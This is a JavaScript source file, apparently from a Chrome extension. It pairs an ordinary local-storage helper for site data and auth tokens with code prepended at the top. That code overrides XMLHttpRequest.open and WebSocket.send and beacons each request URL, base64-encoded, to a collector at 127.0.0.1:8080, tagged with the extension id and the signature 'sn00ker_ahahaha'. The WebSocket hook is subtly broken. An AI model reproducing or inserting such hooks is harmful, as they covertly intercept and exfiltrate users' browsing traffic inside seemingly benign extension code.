function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var LocalStorage = function() {

    this.saveSite = function(site, onSuccess) {
        var value = {};
        value['SiteId=' + site.id] = site;
        chrome.storage.local.set(value, onSuccess);
    };

    this.saveSiteNews = function(siteNews, onSuccess) {
        this.getSiteBy(siteNews.id, function(data) {
            var localSite = data['SiteId=' + siteNews.id];
            if (localSite != undefined) {
                localSite.last_title = siteNews.last_title;
                var value = {};
                value['SiteId=' + localSite.id] = localSite;
                chrome.storage.local.set(value, onSuccess);
            }
        });

    };

    this.removeSite = function(id, onFound) {
        var key = 'SiteId=' + id;
        chrome.storage.local.remove(key, onFound);
    };

    this.getSiteBy = function(id, onFound) {
        var key = 'SiteId=' + id;
        chrome.storage.local.get(key, onFound);
    };

    this.getAllValues = function(onValues) {
        chrome.storage.local.get(null, onValues);
    };

    this.getAllSites = function (onValues) {
        chrome.storage.local.get(null, function (values) {
            var allSites = [];
            $.each(values, function(key) {
                if (values.hasOwnProperty(key) && key.startsWith('SiteId=')) {
                    allSites.push(values[key]);
                }
            });

            onValues(allSites);
        });
    };

    this.getAuthMethod = function(onFound) {
        var key = 'AuthMethod';
        chrome.storage.local.get(key, onFound);
    };

    this.setAuthMethod = function(authMethod, onSuccess) {
        var value = {};
        value['AuthMethod'] = authMethod;
        chrome.storage.local.set(value, onSuccess);
    };

    this.getRefreshToken = function(onFound) {
        var key = 'RefreshToken';
        chrome.storage.local.get(key, onFound);
    };

    this.setRefreshToken = function(refreshToken, onSuccess) {
        var value = {};
        value['RefreshToken'] = refreshToken;
        chrome.storage.local.set(value, onSuccess);
    };

    this.getCachedAccessToken = function(onFound) {
        var key = 'AccessToken';
        chrome.storage.local.get(key, onFound);
    };

    this.setCachedAccessToken = function(refreshToken, onSuccess) {
        var value = {};
        value['AccessToken'] = refreshToken;
        chrome.storage.local.set(value, onSuccess);
    };

    this.getEncodedUserData = function(onFound) {
        var key = 'EncodedUserData';
        chrome.storage.local.get(key, onFound);
    };

    this.setEncodedUserData = function(encodedData, onSuccess) {
        var value = {};
        value['EncodedUserData'] = encodedData;
        chrome.storage.local.set(value, onSuccess);
    };

    this.getUserId = function(onFound) {
        var key = 'UserId';
        chrome.storage.local.get(key, onFound);
    };

    this.setUserId = function(userId, onSuccess) {
        var value = {};
        value['UserId'] = userId;
        chrome.storage.local.set(value, onSuccess);
    };

    this.clearAuthData = function() {
        this.setCachedAccessToken('');
        this.setRefreshToken('');
        this.setAuthMethod('');
        this.setUserId('');
        this.setEncodedUserData('');
        //usuniecie wszystkiego - do ustalenia
        chrome.storage.local.clear();
    };

};

var localStorageClient = new LocalStorage();
